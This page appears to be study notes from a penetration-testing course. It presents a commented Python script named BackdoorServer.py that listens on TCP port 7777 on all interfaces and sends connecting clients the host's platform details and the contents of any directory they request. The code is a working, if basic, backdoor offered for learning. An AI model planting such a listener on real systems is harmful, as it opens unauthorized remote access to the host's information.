---
description: Backdoor Server from Python section of PTSv4 (eLearnSecurity)
---

# BackdoorServer.py

```python
import socket, platform, os

# Listen on user provided IPv4 address
# SRV_ADDR = '' for it to use all available interfaces
# // Alternatively,
# SRV_ADDR = input('Type IP to run server on: ')
# but it would require user input

SRV_ADDR = ""
# Listen on statically defined port:
# SRV_PORT = 7777
# // Alternatively,
# SRV_PORT = int(input('Type port/TCP to listen on: '))
# but it would require user input

SRV_PORT = 7777

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
# bind function assigns user provided IP address and port to the socket
s.bind((SRV_ADDR, SRV_PORT))
# listen for incoming connections
s.listen(1)
# To accept a connection the socket must be bound to an address and
# listening for connections.
# The return value is a pair (conn, address) where conn is
# a new socket object usable to send and receive data
# on the connection, and address is the address bound to the socket
# on the other end of the connection.
connection, address = s.accept()
print('Client connected with address:', address)
# While loop occurs as long as there is 1 connection made
while 1:
    try:
        data = connection.recv(1024)
    except:continue
# If data received from client decodes to "1" in utf-8
# make a variable with the output of the
# platform and machine functions of the platform module
    if(data.decode('utf-8') == '1'):
        tosend = platform.platform() + "" + platform.machine()
        connection.sendall(tosend.encode())
# If data received from client decodes to "2" in utf-8
# make a variable with the output of the
# listdir function of the os module and encode it in utf-8
    elif(data.decode('utf-8') == '2'):
        data = connection.recv(1024)
        try:
            filelist = os.listdir(data.decode('utf-8'))
            tosend = ""
            for x in filelist:
                tosend += "," + x
# If the path doesn't exist assign the string "Wrong Path"
# to the tosend variable and encode
        except:
            tosend = "Wrong path"
        connection.sendall(tosend.encode())
# If data received from client decodes to "0" in utf-8
# close the connection
    elif(data.decode('utf-8') == '0'):
        connection.close()
# Connection socket object and the address of the
# client establishing the connection are passed on
# to the accept function on that connection/address tuple
# so that connection is accepted?
        connection, address = s.accept()
```

